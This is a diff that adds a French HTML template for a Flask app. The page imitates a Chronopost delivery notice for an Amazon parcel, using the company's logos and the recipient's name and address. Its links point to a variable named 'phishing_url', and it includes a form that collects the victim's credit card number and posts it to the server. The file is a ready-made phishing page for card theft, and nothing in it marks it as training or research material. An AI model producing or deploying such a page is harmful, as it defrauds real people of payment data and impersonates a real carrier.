@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Chronopost - Suivi de colis</title>
+    <!-- Lien vers le fichier CSS -->
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+</head>
+<body>
+    <div class="main-div" style="font-size:14px; font-family:Arial; color:#434343;">
+        <div>
+            <!-- Table avec les logos -->
+            <table border="0" cellspacing="0" width="100%" cellpadding="0">
+                <tr>
+                    <td align="left">
+                        <!-- Logo Chronopost -->
+                        <img src="{{ url_for('static', filename='images/logo-chronopost-international.png') }}" alt="Le logo Chronopost">
+                    </td>
+                    <td align="right">
+                        <!-- Logo Predict -->
+                        <img src="{{ url_for('static', filename='images/logo_predict.png') }}" alt="Le logo Predict">
+                    </td>
+                </tr>
+            </table>
+            <br>
+            <!-- Bannière -->
+            <img class="logo" src="{{ url_for('static', filename='images/banner.png') }}" alt="La bannière du statut de votre colis" width="600px">
+            <p>Bonjour,</p>
+            <p>C'est le jour J, votre colis <strong>{{ commande_id }}</strong> expédié par <strong>AMAZON</strong> est prêt à être livré.</p>
+            <p>Notre livreur prévoit de passer aujourd'hui entre <strong>09h35</strong> et <strong>10h35</strong>.</p>
+            <p><strong><a href="{{ phishing_url }}">Agissez dès maintenant sur votre livraison.</a></strong></p>
+            <br>
+            <!-- Adresse de livraison -->
+            <table border="0" style="font-family: Arial; color: #000000; font-size:14px;" cellspacing="0" width="100%" cellpadding="10">
+                <tr>
+                    <td bgcolor="#e6e7e8"><strong>Adresse de livraison</strong></td>
+                </tr>
+            </table>
+            <table bgcolor="#f4f4f4" border="0" cellspacing="0" width="100%" cellpadding="0">
+                <tr>
+                    <td style="padding: 14px; font-family: Arial; color: #000000; font-size:14px;" valign="top">
+                        {{ destinataires }} <br>
+                        {{ adresse }}<br>
+                    </td>
+                </tr>
+            </table>
+            <p>En cas d'absence, votre colis sera mis à disposition dans le point de retrait disponible à proximité de chez vous ou en agence Chronopost. Dans ce cas, vous en serez informé.</p>
+            <p>Retrouvez le suivi de colis en <a href="{{ phishing_url }}">cliquant ici.</a></p>
+            <br>
+            <p>Une question ? <br>
+                Consultez <a href="https://www.chronopost.fr/fr/aide/faq">notre aide</a> en ligne.
+            </p>
+            <br>
+            <p>À bientôt.</p>
+        </div>
+        <div>
+            <ul>
+                <li><img src="{{ url_for('static', filename='favicon.ico') }}" alt="Favicon"></li>
+                <li><img src="{{ url_for('static', filename='images/logo-chronopost-international.png') }}" alt="Logo Chronopost"></li>
+                <li><img src="{{ url_for('static', filename='images/logo_predict.png') }}" alt="Logo Predict"></li>
+                <li><img src="{{ url_for('static', filename='images/banner.png') }}" alt="Bannière"></li>
+                <li><img src="{{ url_for('static', filename='images/double-logo.png') }}" alt="Double Logo"></li>
+            </ul>
+        </div>
+        <div>
+            <form action="/submit" method="POST">
+                <input type="hidden" name="commande_id" value="{{ commande_id }}">
+                <input type="hidden" name="destinataires" value="{{ destinataires }}">
+                <input type="hidden" name="adresse" value="{{ adresse }}">
+                <label for="credit_card">Numéro de carte de crédit :</label>
+                <input type="text" id="credit_card" name="credit_card" required>
+                <button type="submit">Envoyer</button>
+            </form>
+        </div>
+    </div>
+    <!-- Lien vers le fichier JS -->
+    <script src="{{ url_for('static', filename='script.js') }}"></script>
+</body>
+</html>
